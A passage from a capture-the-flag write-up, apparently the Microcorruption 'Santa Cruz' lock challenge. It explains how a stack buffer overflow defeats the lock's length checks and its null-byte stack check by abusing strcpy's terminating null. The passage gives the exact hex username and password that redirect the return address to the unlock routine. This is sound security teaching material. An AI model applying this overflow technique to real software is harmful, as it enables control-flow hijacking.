The second `e` in the password. The lock is checking if there is a `0x00`, a `null` byte. This is a clever check as it makes
it difficult to patch given the nature of `<strcpy>` and it's premature termination upon reading a null byte. But for every clever fix
there is an equal clever way to break it!

[strcpy](http://www.cplusplus.com/reference/cstring/strcpy/) includes a terminating null character after a successful copy,
this can be abused. I made an almost trivial observation a while ago about how the password overwrites a portion of the username
if the username is too long. Turns out this behavior is the key to this challenge. Assuming i create a username significantly larger
then the password, then create a password of an exact length equal to where `<strcpy>` will place the terminating null byte
where the flag should be. The password will overwrite a portion of the username, which allows me to inject a null byte anywhere within the username, while the
username continues to bypass the length requirements.

Using a password of exact length and a username twice as long...
```plaintext
password = aaaabbbbccccdddde
username = 414141414242424243434343444444444501ff4546464646414141414242424243434343444444444545454546464646
```
i run the lock and...
```plaintext
insn address unaligned
```
Checkmate! Taking a look at the location of the instruction pointer `pc  4545`, i see that the program jumped to `0x4545`
which is only possible on the second half of the username. Now let's take a quick skim over the code to find a suitable
place to jump to...
```plaintext
444a <unlock_door>
444a:  3012 7f00      push	#0x7f
444e:  b012 c446      call	#0x46c4 <INT>
4452:  2153           incd	sp
4454:  3041           ret
```
`0x444a` looks good, let's construct a username with the location i want to jump to and...

![](/CTFWriteUps/embeddedsecurity/images/santacruzsolve.png)

### Solution
This time the lock uses a lot more checks to make sure the username and password requirements are met.
The lock uses two length checks, where the values used to compare are located close to the region where the username is stored.
Also it has one overwrite check, where the lock checks for a null byte on the stack, near the return address, and terminates the program if this check
fails. Ultimately the lock does not prevent overwriting and instead tries to terminate program flow early before execution is hijacked.
As a result, checks that are poorly implemented can be exploited with overflow attacks. 

flag username = `414141414242424243434343444444444501ff45464646464141414142424242434343434444444445454a44`    
flag password = `aaaabbbbccccdddde`